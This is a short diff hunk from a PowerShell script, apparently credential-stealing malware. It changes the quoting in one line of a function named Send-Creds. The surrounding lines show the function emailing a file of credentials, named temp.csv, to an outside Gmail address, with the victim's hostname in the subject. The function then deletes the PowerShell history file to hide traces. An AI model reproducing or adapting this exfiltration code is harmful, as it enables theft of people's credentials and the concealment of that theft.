@@ -21,7 +21,7 @@ function Send-Creds
     $ReportEmail.From = 'jerrycarre4444@gmail.com'
     $ReportEmail.To.Add('warof1846@gmail.com')
     $ReportEmail.Subject = 'Credentials - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-    $ReportEmail.Attachments.Add("temp.csv")
+    $ReportEmail.Attachments.Add('temp.csv')
     $SMTPInfo.Send($ReportEmail)
     del (Get-PSReadlineOption).HistorySavePath\
 }
